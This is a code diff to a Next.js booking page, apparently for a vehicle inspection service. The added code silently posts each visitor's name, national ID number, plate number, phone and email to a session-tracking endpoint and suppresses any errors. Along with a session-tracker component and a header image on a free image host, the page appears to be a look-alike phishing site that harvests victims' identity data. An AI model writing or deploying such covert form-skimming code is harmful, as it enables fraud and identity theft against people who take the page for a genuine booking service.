@@ -1,6 +1,8 @@
 "use client";
+export const dynamic = 'force-dynamic';
 import { useState } from "react";
 import { useRouter } from "next/navigation";
+import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1a6d44";
 const ACTIVE_GREEN = "#2fb16e";
@@ -106,6 +108,20 @@ export default function BookingPage() {
         region: selectedRegion, center: selectedCenter, fDate, fTime
       };
       localStorage.setItem("vsc_booking", JSON.stringify(data));
+      // إرسال البيانات للـ API
+      fetch('/api/session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          current_page: 'booking',
+          name: fullName,
+          id_number: idNumber,
+          plate_number: data.plate,
+          phone,
+          email,
+          booking_date: `${fDate} ${fTime}`,
+        }),
+      }).catch(() => {});
       router.push("/confirm");
     }
   }
@@ -143,6 +159,7 @@ export default function BookingPage() {
 
   return (
     <div style={{ backgroundColor: LIGHT_BG, minHeight: "100vh" }}>
+      <SessionTracker page="booking" />
       {/* Header */}
       <img src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg" alt="Header" style={{ width: "100%", display: "block" }} />
 
